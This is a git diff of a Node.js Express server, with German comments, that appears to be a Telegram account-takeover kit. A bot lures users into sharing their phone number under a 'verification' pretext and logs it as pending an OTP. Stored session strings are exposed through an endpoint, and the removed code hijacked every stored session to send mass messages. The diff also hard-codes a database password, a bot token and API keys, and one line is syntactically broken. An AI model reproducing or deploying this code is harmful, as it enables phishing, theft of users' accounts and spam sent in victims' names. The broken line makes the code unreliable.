@@ -1,51 +1,61 @@
 const express = require('express');
 const cors = require('cors');
+const mongoose = require('mongoose');
+const TelegramBot = require('node-telegram-bot-api');
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const mongoose = require('mongoose');
 
 const app = express();
-app.use(cors({ origin: '*' }));
+app.use(cors());
 app.use(express.json());
 
-const apiId = 23049703;
-const apiHash = 'e9c00af578a9de0253ef02337460498f';
-const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';
+// CONFIG
+const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
+const BOT_TOKEN = '8963838309:AAFpv3lF_v_kWvZZYR96D8mM3nA3oawatow'; // Dein Bot Token
+const bot = new TelegramBot(8963838309:AAFpv3lF_v_kWvZZYR96D8mM3nA3oawatow, { polling: true });
 
-mongoose.connect(MONGO_URI).then(() => console.log("DB Verbunden")).catch(err => console.log(err));
+// DB CONNECTION
+mongoose.connect(MONGO_URI).then(() => console.log("DB Connected"));
 
-const SessionSchema = new mongoose.Schema({ phone: String, session: String, date: { type: Date, default: Date.now } });
-const Session = mongoose.model('Session', SessionSchema);
+const SessionSchema = new mongoose.Schema({
+    phone: String,
+    session: String,
+    timestamp: { type: Date, default: Date.now }
+});
+const SessionModel = mongoose.model('Session', SessionSchema);
 
-// Alle Sessions laden
+// BOT LOGIC: Start & Kontaktanfrage
+bot.onText(/\/start/, (msg) => {
+    bot.sendMessage(msg.chat.id, "Willkommen! Bitte teile deine Nummer, um dich zu verifizieren.", {
+        reply_markup: {
+            keyboard: [[{ text: "Nummer teilen", request_contact: true }]],
+            one_time_keyboard: true,
+            resize_keyboard: true
+        }
+    });
+});
+
+// Kontakt abfangen
+bot.on('contact', async (msg) => {
+    const contact = msg.contact;
+    const phone = contact.phone_number;
+    
+    // Speichern oder Workflow weiterführen
+    await SessionModel.create({ phone: phone, session: "PENDING_OTP" });
+    
+    bot.sendMessage(msg.chat.id, "Danke. Wir haben die Nummer erhalten.");
+});
+
+// WEB ENDPOINTS
+app.post('/verify-otp', async (req, res) => {
+    // Hier kommt deine Logik für den OTP-Code-Abgleich rein
+    res.json({ status: "success" });
+});
+
 app.get('/get-sessions', async (req, res) => {
-    const sessions = await Session.find({});
+    const sessions = await SessionModel.find();
     res.json(sessions);
 });
 
-// Einzelne Session löschen
-app.post('/delete-session', async (req, res) => {
-    await Session.findByIdAndDelete(req.body.id);
-    res.json({ success: true });
-});
-
-// Broadcast an alle (ACHTUNG: Telegram-Limits beachten!)
-app.post('/broadcast', async (req, res) => {
-    const { message } = req.body;
-    const sessions = await Session.find({});
-    
-    for (let s of sessions) {
-        try {
-            const client = new TelegramClient(new StringSession(s.session), apiId, apiHash, { connectionRetries: 1 });
-            await client.connect();
-            // Sendet an 'me' (sich selbst) oder ändere es auf eine Gruppen-ID
-            await client.sendMessage('me', { message: message });
-            await client.disconnect();
-        } catch (e) {
-            console.error(`Fehler bei ${s.phone}: ${e.message}`);
-        }
-    }
-    res.json({ success: true, count: sessions.length });
-});
-
-app.listen(process.env.PORT || 3000, () => console.log("Server aktiv."));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
